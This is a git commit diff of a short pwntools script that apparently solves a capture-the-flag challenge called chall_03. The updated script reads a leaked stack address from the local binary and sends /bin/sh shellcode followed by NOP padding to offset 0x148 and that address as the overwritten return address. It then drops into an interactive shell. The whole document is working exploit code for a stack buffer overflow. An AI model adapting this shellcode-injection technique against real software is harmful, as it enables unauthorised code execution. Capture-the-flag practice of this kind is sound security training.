a20a655760c838120a61447a7fac4ec1253b20fd
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-05 20:11:57 -0400

    Update 03.py

--- chall_03/03.py
+++ chall_03/03.py
@@ -1,6 +1,10 @@
 from pwn import *
-p=process("./chall_03")
-p.recv()
-_ = b'leak'
+binary = context.binary = ELF('./chall_03')
+p=process(binary.path)
+p.sendlineafter('She sellz sea shellz by the return address\n','foobar')
+p.recvuntil('Here's a leak :)')
+_ = p.recvline().strip()
 stack = int(_,16)
-p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(payload)) * b'\x90' + p64(stack)))
+
+p.sendline(b'' + asm(shellcraft.sh())+ (0x148 - len(b'' + asm(shellcraft.sh())) * b'\x90' + p64(stack)))
+p.interactive()
